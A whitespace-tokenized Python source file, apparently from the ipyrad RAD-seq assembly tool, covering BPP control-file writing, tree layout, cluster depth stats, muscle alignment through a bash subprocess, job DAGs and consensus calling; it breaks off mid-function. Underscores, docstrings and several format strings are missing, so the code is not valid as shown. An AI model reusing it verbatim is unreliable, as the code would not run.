0 ] , " " . join ( [ str ( i ) for i in delimit alg [ 1 : ] ] ) ) ) ## if using i BPP (if not traits df, we assume you're using bpp (v.3.3+) if isinstance ( traits df , pd . Data Frame ) : ## check that the data frame is properly formatted try : traits df . values . astype ( float ) except Exception : raise I Pyrad Warning Exit ( PDREAD ERROR ) ## subsample to keep only samples that are in IMAP, we do not need to ## standarize traits b/c ibpp does that for us. samples = sorted ( list ( itertools . chain ( * imap . values ( ) ) ) ) didx = [ list ( traits df . index ) . index ( i ) for i in traits df . index if i not in samples ] dtraits = traits df . drop ( traits df . index [ didx ] ) ## mean standardize traits values after excluding samples straits = dtraits . apply ( lambda x : ( x - x . mean ( ) ) / ( x . std ( ) ) ) ## convert Na N to "NA" cuz that's what ibpp likes, and write to file ftraits = straits . fillna ( "NA" ) traitdict = ftraits . T . to dict ( "list" ) ## get reverse imap dict rev = { val : key for key in sorted ( imap ) for val in imap [ key ] } ## write trait file traitfile = "{}.{}.traits.txt" . format ( os . path . join ( wdir , name ) , prog ) with open ( traitfile , 'w' ) as tout : tout . write ( "Indiv\n" ) tout . write ( "\t" . join ( [ 'Species' ] + list ( ftraits . columns ) ) + "\n" ) #for key in sorted(traitdict): #    tout.write("\t".join([key, rev[key]] + \ #        ["^"+str(i) for i in traitdict[key]])+"\n" #        ) nind T = 0 for ikey in sorted ( imap . keys ( ) ) : samps = imap [ ikey ] for samp in sorted ( samps ) : if samp in traitdict : tout . write ( "\t" . join ( [ samp , rev [ samp ] ] + [ str ( i ) for i in traitdict [ samp ] ] ) + "\n" ) nind T += 1 #    tout.write("Indiv\n"+"\t".join(["Species"]+\ #    ["t {}".format(i) for i in range(len(traitdict.values()[0]))])+"\n") #    for key in sorted(traitdict): #        print >>tout, "\t".join([key, rev[key]] + \ #                                [str(i) for i in traitdict[key]]) #ftraits.to csv(traitfile) ## write ntraits and nind T and traitfilename ctl . append ( "ntraits = {}" . format ( traits df . shape [ 1 ] ) ) ctl . append ( "nind T = {}" . format ( nind T ) ) #traits df.shape[0])) ctl . append ( "usetraitdata = {}" . format ( usetraitdata ) ) ctl . append ( "useseqdata = {}" . format ( useseqdata ) ) ## trait priors ctl . append ( "nu0 = {}" . format ( nu0 ) ) ctl . append ( "kappa0 = {}" . format ( kappa0 ) ) ## remove ibpp incompatible options ctl . remove ( "usedata = {}" . format ( useseqdata ) ) ctl . remove ( "speciestree = {}" . format ( infer sptree ) ) ## get tree values nspecies = str ( len ( imap ) ) species = " " . join ( sorted ( imap ) ) ninds = " " . join ( [ str ( len ( imap [ i ] ) ) for i in sorted ( imap ) ] ) ## write the tree ctl . append ( . format ( nspecies , species , ninds , guidetree ) ) ## priors ctl . append ( "thetaprior = {} {}" . format ( * thetaprior ) ) ctl . append ( "tauprior = {} {} {}" . format ( * tauprior ) ) ## other values, fixed for now ctl . append ( "finetune = 1: {}" . format ( " " . join ( [ str ( i ) for i in finetune ] ) ) ) #CTL.append("finetune = 1: 1 0.002 0.01 0.01 0.02 0.005 1.0") ctl . append ( "print = 1 0 0 0" ) ctl . append ( "burnin = {}" . format ( burnin ) ) ctl . append ( "sampfreq = {}" . format ( sampfreq ) ) ctl . append ( "nsample = {}" . format ( nsample ) ) ## write out the ctl file with open ( "{}.{}.ctl.txt" . format ( OPJ ( wdir , name ) , prog ) , 'w' ) as out : out . write ( "\n" . join ( ctl ) ) ## if verbose print ctl if verbose : sys . stderr . write ( "ctl file\n--------\n" + "\n" . join ( ctl ) + "\n--------\n\n" )
def collapse outgroup ( tree , taxdicts ) : ## check that all tests have the same outgroup outg = taxdicts [ 0 ] [ "p4" ] if not all ( [ i [ "p4" ] == outg for i in taxdicts ] ) : raise Exception ( "no good" ) ## prune tree, keep only one sample from outgroup tre = ete . Tree ( tree . write ( format = 1 ) ) #tree.copy(method="deepcopy") alltax = [ i for i in tre . get leaf names ( ) if i not in outg ] alltax += [ outg [ 0 ] ] tre . prune ( alltax ) tre . search nodes ( name = outg [ 0 ] ) [ 0 ] . name = "outgroup" tre . ladderize ( ) ## remove other ougroups from taxdicts taxd = copy . deepcopy ( taxdicts ) newtaxdicts = [ ] for test in taxd : #test["p4"] = [outg[0]] test [ "p4" ] = [ "outgroup" ] newtaxdicts . append ( test ) return tre , newtaxdicts
def decompose tree ( ttree , orient = 'right' , use edge lengths = True ) : ## set attributes ttree . orient = orient ttree . use edge lengths = use edge lengths ult = use edge lengths == False ## map numeric values to internal nodes from root to tips names = { } idx = 0 for node in ttree . tree . traverse ( "preorder" ) : if not node . is leaf ( ) : if node . name : names [ idx ] = node . name else : names [ idx ] = idx node . name = str ( idx ) node . idx = idx idx += 1 ## map number to the tips, these will be the highest numbers for node in ttree . tree . get leaves ( ) : names [ idx ] = node . name node . idx = idx idx += 1 ## create empty edges and coords arrays ttree . node labels = names ttree . tip labels = ttree . tree . get leaf names ( ) #self.tip labels = self.tree.get leaf names()[::-1] #self.node labels = self.names ttree . edges = np . zeros ( ( idx - 1 , 2 ) , dtype = int ) ttree . verts = np . zeros ( ( idx , 2 ) , dtype = float ) ttree . lines = [ ] # np.zeros((ntips-1), dtype=int) ttree . coords = [ ] # np.zeros((idx * 2 - ntips), dtype=float) ## postorder: first children and then parents. This moves up the list . nidx = 0 tip num = len ( ttree . tree . get leaves ( ) ) - 1 ## tips to root to fill in the verts and edges for node in ttree . tree . traverse ( "postorder" ) : if node . is leaf ( ) : ## set the xy-axis positions of the tips node . y = ttree . tree . get distance ( node ) if ult : node . y = 0. node . x = tip num tip num -= 1 ## edges connect this vert to ttree . verts [ node . idx ] = [ node . x , node . y ] ttree . edges [ nidx ] = [ node . up . idx , node . idx ] elif node . is root ( ) : node . y = ttree . tree . get distance ( node ) if ult : node . y = - 1 * node . get farthest leaf ( True ) [ 1 ] - 1 node . x = sum ( i . x for i in node . children ) / float ( len ( node . children ) ) ttree . verts [ node . idx ] = [ node . x , node . y ] else : ## create new nodes left and right node . y = ttree . tree . get distance ( node ) if ult : node . y = - 1 * node . get farthest leaf ( True ) [ 1 ] - 1 node . x = sum ( i . x for i in node . children ) / float ( len ( node . children ) ) ttree . edges [ nidx , : ] = [ node . up . idx , node . idx ] ttree . verts [ node . idx ] = [ node . x , node . y ] nidx += 1 ## root to tips to fill in the coords and lines cidx = 0 for node in ttree . tree . traverse ( ) : ## add yourself if not node . is leaf ( ) : ttree . coords += [ [ node . x , node . y ] ] pidx = cidx cidx += 1 for child in node . children : ## add children ttree . coords += [ [ child . x , node . y ] , [ child . x , child . y ] ] ttree . lines += [ [ pidx , cidx ] ] ## connect yourself to newx ttree . lines += [ [ cidx , cidx + 1 ] ] ## connect newx to child cidx += 2 ttree . coords = np . array ( ttree . coords , dtype = float ) ttree . lines = np . array ( ttree . lines , dtype = int ) ## invert for sideways trees if ttree . orient in [ 'up' , 0 ] : pass if ttree . orient in [ 'left' , 1 ] : ttree . verts [ : , 1 ] = ttree . verts [ : , 1 ] * - 1 ttree . verts = ttree . verts [ : , [ 1 , 0 ] ] ttree . coords [ : , 1 ] = ttree . coords [ : , 1 ] * - 1 ttree . coords = ttree . coords [ : , [ 1 , 0 ] ] if ttree . orient in [ 'down' , 0 ] : ttree . verts [ : , 1 ] = ttree . verts [ : , 1 ] * - 1 ttree . coords [ : , 1 ] = ttree . coords [ : , 1 ] * - 1 if ttree . orient in [ 'right' , 3 ] : ttree . verts = ttree . verts [ : , [ 1 , 0 ] ] ttree . coords = ttree . coords [ : , [ 1 , 0 ] ]
def get quick depths ( data , sample ) : ## use existing sample cluster path if it exists, since this ## func can be used in step 4 and that can occur after merging ## assemblies after step3, and if we then referenced by data.dirs.clusts ## the path would be broken. ## ## If branching at step 3 to test different clust thresholds, the ## branched samples will retain the samples.files.clusters of the ## parent (which have the clust threshold value of the parent), so ## it will look like nothing has changed. If we call this func ## from step 3 then it indicates we are in a branch and should ## reset the sample.files.clusters handle to point to the correct ## data.dirs.clusts directory. See issue #229. ## Easier to just always trust that samples.files.clusters is right, ## no matter what step? #if sample.files.clusters and not sample.stats.state == 3: #    pass #else: #    ## set cluster file handles sample . files . clusters = os . path . join ( data . dirs . clusts , sample . name + ".clust S.gz" ) ## get new clustered loci fclust = data . samples [ sample . name ] . files . clusters clusters = gzip . open ( fclust , 'r' ) pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) ## storage depths = [ ] maxlen = [ ] ## start with cluster 0 tdepth = 0 tlen = 0 ## iterate until empty while 1 : ## grab next try : name , seq = pairdealer . next ( ) except Stop Iteration : break ## if not the end of a cluster #print name.strip(), seq.strip() if name . strip ( ) == seq . strip ( ) : depths . append ( tdepth ) maxlen . append ( tlen ) tlen = 0 tdepth = 0 else : tdepth += int ( name . split ( ";" ) [ - 2 ] [ 5 : ] ) tlen = len ( seq ) ## return clusters . close ( ) return np . array ( maxlen ) , np . array ( depths )
def sample cleanup ( data , sample ) : ## get maxlen and depths array from clusters maxlens , depths = get quick depths ( data , sample ) try : depths . max ( ) except Value Error : ## If depths is an empty array max() will raise print ( "    no clusters found for {}" . format ( sample . name ) ) return ## Test if depths is non-empty, but just full of zeros. if depths . max ( ) : ## store which min was used to calculate hidepth here sample . stats dfs . s3 [ "hidepth min" ] = data . paramsdict [ "mindepth majrule" ] ## If our longest sequence is longer than the current max fragment length ## then update max fragment length. For assurance we require that ## max len is 4 greater than maxlen, to allow for pair separators. hidepths = depths >= data . paramsdict [ "mindepth majrule" ] maxlens = maxlens [ hidepths ] ## Handle the case where there are no hidepth clusters if maxlens . any ( ) : maxlen = int ( maxlens . mean ( ) + ( 2. * maxlens . std ( ) ) ) else : maxlen = 0 if maxlen > data . hackersonly [ "max fragment length" ] : data . hackersonly [ "max fragment length" ] = maxlen + 4 ## make sense of stats keepmj = depths [ depths >= data . paramsdict [ "mindepth majrule" ] ] keepstat = depths [ depths >= data . paramsdict [ "mindepth statistical" ] ] ## sample summary stat assignments sample . stats [ "state" ] = 3 sample . stats [ "clusters total" ] = depths . shape [ 0 ] sample . stats [ "clusters hidepth" ] = keepmj . shape [ 0 ] ## store depths histogram as a dict. Limit to first 25 bins bars , bins = np . histogram ( depths , bins = range ( 1 , 26 ) ) sample . depths = { int ( i ) : v for i , v in zip ( bins , bars ) if v } ## sample stat assignments ## Trap numpy warnings ("mean of empty slice") printed by samples ## with few reads. with warnings . catch warnings ( ) : warnings . simplefilter ( "ignore" , category = Runtime Warning ) sample . stats dfs . s3 [ "merged pairs" ] = sample . stats . reads merged sample . stats dfs . s3 [ "clusters total" ] = depths . shape [ 0 ] try : sample . stats dfs . s3 [ "clusters hidepth" ] = int ( sample . stats [ "clusters hidepth" ] ) except Value Error : ## Handle clusters hidepth == Na N sample . stats dfs . s3 [ "clusters hidepth" ] = 0 sample . stats dfs . s3 [ "avg depth total" ] = depths . mean ( ) LOGGER . debug ( "total depth {}" . format ( sample . stats dfs . s3 [ "avg depth total" ] ) ) sample . stats dfs . s3 [ "avg depth mj" ] = keepmj . mean ( ) LOGGER . debug ( "mj depth {}" . format ( sample . stats dfs . s3 [ "avg depth mj" ] ) ) sample . stats dfs . s3 [ "avg depth stat" ] = keepstat . mean ( ) sample . stats dfs . s3 [ "sd depth total" ] = depths . std ( ) sample . stats dfs . s3 [ "sd depth mj" ] = keepmj . std ( ) sample . stats dfs . s3 [ "sd depth stat" ] = keepstat . std ( ) else : print ( "    no clusters found for {}" . format ( sample . name ) ) ## Get some stats from the bam files ## This is moderately hackish. samtools flagstat returns ## the number of reads in the bam file as the first element ## of the first line, this call makes this assumption. if not data . paramsdict [ "assembly method" ] == "denovo" : refmap stats ( data , sample ) log level = logging . get Level Name ( LOGGER . get Effective Level ( ) ) if not log level == "DEBUG" : ## Clean up loose files only if not in DEBUG ##- edits/*derep, utemp, *utemp.sort, *htemp, *clust.gz derepfile = os . path . join ( data . dirs . edits , sample . name + " derep.fastq" ) mergefile = os . path . join ( data . dirs . edits , sample . name + " merged .fastq" ) uhandle = os . path . join ( data . dirs . clusts , sample . name + ".utemp" ) usort = os . path . join ( data . dirs . clusts , sample . name + ".utemp.sort" ) hhandle = os . path . join ( data . dirs . clusts , sample . name + ".htemp" ) clusters = os . path . join ( data . dirs . clusts , sample . name + ".clust.gz" ) for f in [ derepfile , mergefile , uhandle , usort , hhandle , clusters ] : try : os . remove ( f ) except : pass
def persistent popen align3 ( clusts , maxseqs = 200 , is gbs = False ) : ## create a separate shell for running muscle in, this is much faster ## than spawning a separate subprocess for each muscle call proc = sps . Popen ( [ "bash" ] , stdin = sps . PIPE , stdout = sps . PIPE , universal newlines = True ) ## iterate over clusters in this file until finished aligned = [ ] for clust in clusts : ## new alignment string for read1s and read2s align1 = "" align2 = "" ## don't bother aligning if only one seq if clust . count ( ">" ) == 1 : aligned . append ( clust . replace ( ">" , "" ) . strip ( ) ) else : ## do we need to split the alignment? (is there a PE insert?) try : ## make into list (only read maxseqs lines, 2X cuz names) lclust = clust . split ( ) [ : maxseqs * 2 ] ## try to split cluster list at nnnn separator for each read lclust1 = list ( itertools . chain ( * zip ( lclust [ : : 2 ] , [ i . split ( "nnnn" ) [ 0 ] for i in lclust [ 1 : : 2 ] ] ) ) ) lclust2 = list ( itertools . chain ( * zip ( lclust [ : : 2 ] , [ i . split ( "nnnn" ) [ 1 ] for i in lclust [ 1 : : 2 ] ] ) ) ) ## put back into strings clust1 = "\n" . join ( lclust1 ) clust2 = "\n" . join ( lclust2 ) ## Align the first reads. ## The muscle command with alignment as stdin and // as splitter cmd1 = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( clust1 , ipyrad . bins . muscle , "//" ) ## send cmd1 to the bash shell print ( cmd1 , file = proc . stdin ) ## read the stdout by line until splitter is reached ## meaning that the alignment is finished. for line in iter ( proc . stdout . readline , '//\n' ) : align1 += line ## Align the second reads. ## The muscle command with alignment as stdin and // as splitter cmd2 = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( clust2 , ipyrad . bins . muscle , "//" ) ## send cmd2 to the bash shell print ( cmd2 , file = proc . stdin ) ## read the stdout by line until splitter is reached ## meaning that the alignment is finished. for line in iter ( proc . stdout . readline , '//\n' ) : align2 += line ## join up aligned read1 and read2 and ensure names order matches la1 = align1 [ 1 : ] . split ( "\n>" ) la2 = align2 [ 1 : ] . split ( "\n>" ) dalign1 = dict ( [ i . split ( "\n" , 1 ) for i in la1 ] ) dalign2 = dict ( [ i . split ( "\n" , 1 ) for i in la2 ] ) align1 = [ ] try : keys = sorted ( dalign1 . keys ( ) , key = DEREP , reverse = True ) except Value Error as inst : ## Lines is empty. This means the call to muscle alignment failed. ## Not sure how to handle this, but it happens only very rarely. LOGGER . error ( "Muscle alignment failed: Bad clust - {}\n Bad lines - {}" . format ( clust , lines ) ) continue ## put seed at top of alignment seed = [ i for i in keys if i . split ( ";" ) [ - 1 ] [ 0 ] == "*" ] [ 0 ] keys . pop ( keys . index ( seed ) ) keys = [ seed ] + keys for key in keys : align1 . append ( "\n" . join ( [ key , dalign1 [ key ] . replace ( "\n" , "" ) + "nnnn" + dalign2 [ key ] . replace ( "\n" , "" ) ] ) ) ## append aligned cluster string aligned . append ( "\n" . join ( align1 ) . strip ( ) ) ## Malformed clust. Dictionary creation with only 1 element will raise. except Value Error as inst : LOGGER . debug ( "Bad PE cluster - {}\nla1 - {}\nla2 - {}" . format ( clust , la1 , la2 ) ) ## Either reads are SE, or at least some pairs are merged. except Index Error : ## limit the number of input seqs lclust = "\n" . join ( clust . split ( ) [ : maxseqs * 2 ] ) ## the muscle command with alignment as stdin and // as splitter cmd = "echo -e '{}' | {} -quiet -in - ; echo {}" . format ( lclust , ipyrad . bins . muscle , "//" ) ## send cmd to the bash shell (TODO: PIPE could overflow here!) print ( cmd , file = proc . stdin ) ## read the stdout by line until // is reached. This BLOCKS. for line in iter ( proc . stdout . readline , '//\n' ) : align1 += line ## remove '>' from names, and '\n' from inside long seqs                 lines = align1 [ 1 : ] . split ( "\n>" ) try : ## find seed of the cluster and put it on top. seed = [ i for i in lines if i . split ( ";" ) [ - 1 ] [ 0 ] == "*" ] [ 0 ] lines . pop ( lines . index ( seed ) ) lines = [ seed ] + sorted ( lines , key = DEREP , reverse = True ) except Value Error as inst : ## Lines is empty. This means the call to muscle alignment failed. ## Not sure how to handle this, but it happens only very rarely. LOGGER . error ( "Muscle alignment failed: Bad clust - {}\n Bad lines - {}" . format ( clust , lines ) ) continue ## format remove extra newlines from muscle aa = [ i . split ( "\n" , 1 ) for i in lines ] align1 = [ i [ 0 ] + '\n' + "" . join ( [ j . replace ( "\n" , "" ) for j in i [ 1 : ] ] ) for i in aa ] ## trim edges in sloppy gbs/ezrad data. Maybe relevant to other types too... if is gbs : align1 = gbs trim ( align1 ) ## append to aligned aligned . append ( "\n" . join ( align1 ) . strip ( ) ) # cleanup proc . stdout . close ( ) if proc . stderr : proc . stderr . close ( ) proc . stdin . close ( ) proc . wait ( ) ## return the aligned clusters return aligned
def align and parse ( handle , max internal indels = 5 , is gbs = False ) : ## data are already chunked, read in the whole thing. bail if no data. try : with open ( handle , 'rb' ) as infile : clusts = infile . read ( ) . split ( "//\n//\n" ) ## remove any empty spots clusts = [ i for i in clusts if i ] ## Skip entirely empty chunks if not clusts : raise I Pyrad Error except ( IO Error , I Pyrad Error ) : LOGGER . debug ( "skipping empty chunk - {}" . format ( handle ) ) return 0 ## count discarded clusters for printing to stats later highindels = 0 ## iterate over clusters sending each to muscle, splits and aligns pairs try : aligned = persistent popen align3 ( clusts , 200 , is gbs ) except Exception as inst : LOGGER . debug ( "Error in handle - {} - {}" . format ( handle , inst ) ) #raise I Pyrad Warning Exit("error hrere {}".format(inst)) aligned = [ ] ## store good alignments to be written to file refined = [ ] ## filter and trim alignments for clust in aligned : ## check for too many internal indels filtered = aligned indel filter ( clust , max internal indels ) ## reverse complement matches. No longer implemented. #filtered = overshoot filter(clust) ## finally, add to outstack if alignment is good if not filtered : refined . append ( clust ) #"\n".join(stack)) else : highindels += 1 ## write to file after if refined : outhandle = handle . rsplit ( "." , 1 ) [ 0 ] + ".aligned" with open ( outhandle , 'wb' ) as outfile : outfile . write ( "\n//\n//\n" . join ( refined ) + "\n" ) ## remove the old tmp file log level = logging . get Level Name ( LOGGER . get Effective Level ( ) ) if not log level == "DEBUG" : os . remove ( handle ) return highindels
def aligned indel filter ( clust , max internal indels ) : ## make into list lclust = clust . split ( ) ## paired or not try : seq1 = [ i . split ( "nnnn" ) [ 0 ] for i in lclust [ 1 : : 2 ] ] seq2 = [ i . split ( "nnnn" ) [ 1 ] for i in lclust [ 1 : : 2 ] ] intindels1 = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq1 ] intindels2 = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq2 ] intindels = intindels1 + intindels2 if max ( intindels ) > max internal indels : return 1 except Index Error : seq1 = lclust [ 1 : : 2 ] intindels = [ i . rstrip ( "-" ) . lstrip ( "-" ) . count ( "-" ) for i in seq1 ] if max ( intindels ) > max internal indels : return 1 return 0
def setup dirs ( data ) : ## make output folder for clusters pdir = os . path . realpath ( data . paramsdict [ "project dir" ] ) data . dirs . clusts = os . path . join ( pdir , "{} clust {}" . format ( data . name , data . paramsdict [ "clust threshold" ] ) ) if not os . path . exists ( data . dirs . clusts ) : os . mkdir ( data . dirs . clusts ) ## make a tmpdir for align files data . tmpdir = os . path . abspath ( os . path . expanduser ( os . path . join ( pdir , data . name + '-tmpalign' ) ) ) if not os . path . exists ( data . tmpdir ) : os . mkdir ( data . tmpdir ) ## If ref mapping, init samples and make the refmapping output directory. if not data . paramsdict [ "assembly method" ] == "denovo" : ## make output directory for read mapping process data . dirs . refmapping = os . path . join ( pdir , "{} refmapping" . format ( data . name ) ) if not os . path . exists ( data . dirs . refmapping ) : os . mkdir ( data . dirs . refmapping )
def build dag ( data , samples ) : ## Create DA Gs for the assembly method being used, store jobs in nodes snames = [ i . name for i in samples ] dag = nx . Di Graph ( ) ## get list of pre-align jobs from globals based on assembly method joborder = JOBORDER [ data . paramsdict [ "assembly method" ] ] ## WHICH JOBS TO RUN: iterate over the sample names for sname in snames : ## append pre-align job for each sample to nodes list for func in joborder : dag . add node ( "{}-{}-{}" . format ( func , 0 , sname ) ) ## append align func jobs, each will have max 10 for chunk in xrange ( 10 ) : dag . add node ( "{}-{}-{}" . format ( "muscle align" , chunk , sname ) ) ## append final reconcat jobs dag . add node ( "{}-{}-{}" . format ( "reconcat" , 0 , sname ) ) ## ORDER OF JOBS: add edges/dependency between jobs: (first-this, then-that) for sname in snames : for sname2 in snames : ## enforce that clust/map cannot start until derep is done for ALL ## samples. This is b/c... dag . add edge ( "{}-{}-{}" . format ( joborder [ 0 ] , 0 , sname2 ) , "{}-{}-{}" . format ( joborder [ 1 ] , 0 , sname ) ) ## add remaining pre-align jobs  for idx in xrange ( 2 , len ( joborder ) ) : dag . add edge ( "{}-{}-{}" . format ( joborder [ idx - 1 ] , 0 , sname ) , "{}-{}-{}" . format ( joborder [ idx ] , 0 , sname ) ) ## Add 10 align jobs, none of which can start until all chunker jobs ## are finished. Similarly, reconcat jobs cannot start until all align ## jobs are finished. for sname2 in snames : for chunk in range ( 10 ) : dag . add edge ( "{}-{}-{}" . format ( "muscle chunker" , 0 , sname2 ) , "{}-{}-{}" . format ( "muscle align" , chunk , sname ) ) ## add that the final reconcat job can't start until after ## each chunk of its own sample has finished aligning. dag . add edge ( "{}-{}-{}" . format ( "muscle align" , chunk , sname ) , "{}-{}-{}" . format ( "reconcat" , 0 , sname ) ) ## return the dag return dag , joborder
def plot dag ( dag , results , snames ) : try : import matplotlib . pyplot as plt from matplotlib . dates import date2num from matplotlib . cm import gist rainbow ## first figure is dag layout plt . figure ( "dag layout" , figsize = ( 10 , 10 ) ) nx . draw ( dag , pos = nx . spring layout ( dag ) , node color = 'pink' , with labels = True ) plt . savefig ( "./dag layout.png" , bbox inches = 'tight' , dpi = 200 ) ## second figure is times for steps pos = { } colors = { } for node in dag : #jobkey = "{}-{}".format(node, sample) mtd = results [ node ] . metadata start = date2num ( mtd . started ) #runtime = date2num(md.completed)# - start ## sample id to separate samples on x-axis , , sname = node . split ( "-" , 2 ) sid = snames . index ( sname ) ## 1e6 to separate on y-axis pos [ node ] = ( start + sid , start * 1e6 ) colors [ node ] = mtd . engine id ## x just spaces out samples; ## y is start time of each job with edge leading to next job ## color is the engine that ran the job ## all jobs were submitted as 3 second wait times plt . figure ( "dag starttimes" , figsize = ( 10 , 16 ) ) nx . draw ( dag , pos , node list = colors . keys ( ) , node color = colors . values ( ) , cmap = gist rainbow , with labels = True ) plt . savefig ( "./dag starttimes.png" , bbox inches = 'tight' , dpi = 200 ) except Exception as inst : LOGGER . warning ( inst )
def run ( data , samples , noreverse , maxindels , force , ipyclient ) : ## list of samples to submit to queue subsamples = [ ] ## if sample is already done skip for sample in samples : ## If sample not in state 2 don't try to cluster it. if sample . stats . state < 2 : print ( . format ( sample . name ) ) continue if not force : if sample . stats . state >= 3 : print ( . format ( sample . name ) ) else : if sample . stats . reads passed filter : subsamples . append ( sample ) else : ## force to overwrite if sample . stats . reads passed filter : subsamples . append ( sample ) ## run subsamples if not subsamples : print ( "  No Samples ready to be clustered. First run step2()." ) else : ## arguments to apply jobs, inst catches exceptions try : ## make dirs that are needed including tmpdir setup dirs ( data ) ## if refmapping make filehandles that will be persistent if not data . paramsdict [ "assembly method" ] == "denovo" : for sample in subsamples : refmap init ( data , sample , force ) ## set thread-count to 2 for paired-data nthreads = 2 ## set thread-count to 1 for single-end data           else : nthreads = 1 ## overwrite nthreads if value in  ipcluster dict if "threads" in data . ipcluster . keys ( ) : nthreads = int ( data . ipcluster [ "threads" ] ) ## if more CP Us than there are samples then increase threads ncpus = len ( ipyclient ) if ncpus > 2 * len ( data . samples ) : nthreads *= 2 ## submit jobs to be run on cluster args = [ data , subsamples , ipyclient , nthreads , maxindels , force ] new apply jobs ( * args ) finally : ## this can fail if jobs were not stopped properly and are still ## writing to tmpdir. don't cleanup if debug is on. try : log level = logging . get Level Name ( LOGGER . get Effective Level ( ) ) if not log level == "DEBUG" : if os . path . exists ( data . tmpdir ) : shutil . rmtree ( data . tmpdir ) ## get all refmap derep.fastqs rdereps = glob . glob ( os . path . join ( data . dirs . edits , "*-refmap derep.fastq" ) ) ## Remove the unmapped fastq files for rmfile in rdereps : os . remove ( rmfile ) except Exception as : LOGGER . warning ( "failed to cleanup files/dirs" )
def parse params ( args ) : ## check that params.txt file is correctly formatted. try : with open ( args . params ) as paramsin : plines = paramsin . readlines ( ) except IO Error as : sys . exit ( "  No params file found" ) ## check header: big version changes can be distinguished by the header legacy version = 0 try : ## try to update the Assembly ... legacy version = 1 if not len ( plines [ 0 ] . split ( ) [ 0 ] ) == 7 : raise I Pyrad Warning Exit ( . format ( args . params , ip . version ) ) except Index Error : raise I Pyrad Warning Exit ( . format ( args . params ) ) ## update and backup if legacy version : #which version... #update to 6() pass ## make into a dict. Ignore blank lines at the end of file ## Really this will ignore all blank lines items = [ i . split ( "##" ) [ 0 ] . strip ( ) for i in plines [ 1 : ] if not i . strip ( ) == "" ] #keys = [i.split("]")[-2][-1] for i in plines[1:]] #keys = range(len(plines)-1) keys = ip . Assembly ( 'null' , quiet = True ) . paramsdict . keys ( ) parsedict = { str ( i ) : j for i , j in zip ( keys , items ) } return parsedict
def showstats ( parsedict ) : #project dir = parsedict['1'] project dir = parsedict [ "project dir" ] if not project dir : project dir = "./" ## Be nice if somebody also puts in the file extension #assembly name = parsedict['0'] assembly name = parsedict [ "assembly name" ] my assembly = os . path . join ( project dir , assembly name ) ## If the project dir doesn't exist don't even bother trying harder. if not os . path . isdir ( project dir ) : msg = . format ( project dir ) sys . exit ( msg ) if not assembly name : msg = . format ( project dir ) raise I Pyrad Error ( msg ) data = ip . load json ( my assembly , quiet = True , cli = True ) print ( "\n Summary stats of Assembly {}" . format ( data . name ) + "\n------------------------------------------------" ) if not data . stats . empty : print ( data . stats ) print ( "\n\n Full stats files" + "\n------------------------------------------------" ) fullcurdir = os . path . realpath ( os . path . curdir ) for i in range ( 1 , 8 ) : #enumerate(sorted(data.stats files)): key = "s" + str ( i ) try : val = data . stats files [ key ] val = val . replace ( fullcurdir , "." ) print ( "step {}: {}" . format ( i , val ) ) except ( Key Error , Attribute Error ) : print ( "step {}: None" . format ( i ) ) print ( "\n" ) else : print ( "No stats to display" )
def check version ( ) : import urllib2 from distutils . version import Loose Version header = "\n -------------------------------------------------------------" + "\n  ipyrad [v.{}]" . format ( ip . version ) + "\n  Interactive assembly and analysis of RAD-seq data" + "\n -------------------------------------------------------------" try : htmldat = urllib2 . urlopen ( "https://anaconda.org/ipyrad/ipyrad" ) . readlines ( ) curversion = next ( ( x for x in htmldat if "subheader" in x ) , None ) . split ( ">" ) [ 1 ] . split ( "<" ) [ 0 ] if Loose Version ( ip . version ) < Loose Version ( curversion ) : msg = . format ( curversion ) print ( header + "\n" + msg ) else : pass #print("You are up to date") except Exception as inst : ## Always fail silently pass
def get binom ( base1 , base2 , est E , est H ) : prior homo = ( 1. - est H ) / 2. prior hete = est H ## calculate probs bsum = base1 + base2 hetprob = scipy . misc . comb ( bsum , base1 ) / ( 2. ** ( bsum ) ) homoa = scipy . stats . binom . pmf ( base2 , bsum , est E ) homob = scipy . stats . binom . pmf ( base1 , bsum , est E ) ## calculate probs hetprob *= prior hete homoa *= prior homo homob *= prior homo ## final  probabilities = [ homoa , homob , hetprob ] bestprob = max ( probabilities ) / float ( sum ( probabilities ) ) ## return if hetprob > homoa : return True , bestprob else : return False , bestprob
def newconsensus ( data , sample , tmpchunk , optim ) : ## do reference map funcs? isref = "reference" in data . paramsdict [ "assembly method" ] ## temporarily store the mean estimates to Assembly data . este = data . stats . error est . mean ( ) data . esth = data . stats . hetero est . mean ( ) ## get number relative to tmp file tmpnum = int ( tmpchunk . split ( "." ) [ - 1 ] ) ## prepare data for reading clusters = open ( tmpchunk , 'rb' ) pairdealer = itertools . izip ( * [ iter ( clusters ) ] * 2 ) maxlen = data . hackersonly [ "max fragment length" ] ## write to tmp cons to file to be combined later consenshandle = os . path . join ( data . dirs . consens , sample . name + " tmpcons." + str ( tmpnum ) ) tmp5 = consenshandle . replace ( " tmpcons." , " tmpcats." ) with h5py . File ( tmp5 , 'w' ) as io5 : io5 . create dataset ( "cats" , ( optim , maxlen , 4 ) , dtype = np . uint32 ) io5 . create dataset ( "alls" , ( optim , ) , dtype = np . uint8 ) io5 . create dataset ( "chroms" , ( optim , 3 ) , dtype = np . int64 ) ## local copies to use to fill the arrays catarr = io5 [ "cats" ] [ : ] nallel = io5 [ "alls" ] [ : ] refarr = io5 [ "chroms" ] [ : ] ## if reference-mapped then parse the fai to get index number of chroms if isref : fai = pd . read csv ( data . paramsdict [ "reference sequence" ] + ".fai" , names = [ 'scaffold' , 'size' , 'sumsize' , 'a' , 'b' ] , sep = "\t" ) faidict = { j : i for i , j in enumerate ( fai . scaffold ) } ## store data for stats counters counters = { "name" : tmpnum , "heteros" : 0 , "nsites" : 0 , "nconsens" : 0 } ## store data for what got filtered filters = { "depth" : 0 , "maxh" : 0 , "maxn" : 0 } ## store data for writing storeseq = { } ## set max limits if 'pair' in data . paramsdict [ "datatype" ] : maxhet = sum ( data . paramsdict [ "max Hs consens" ] ) maxn = sum ( data . paramsdict [ "max Ns consens" ] ) else : maxhet = data . paramsdict [ "max Hs consens" ] [ 0 ] maxn = data . paramsdict [ "max Ns consens" ] [ 0 ] ## load the refmap dictionary if refmapping done = 0 while not done : try : done , chunk = clustdealer ( pairdealer , 1 ) except Index Error : raise I Pyrad Error ( "clustfile formatting error in %s" , chunk ) if chunk : ## get names and seqs piece = chunk [ 0 ] . strip ( ) . split 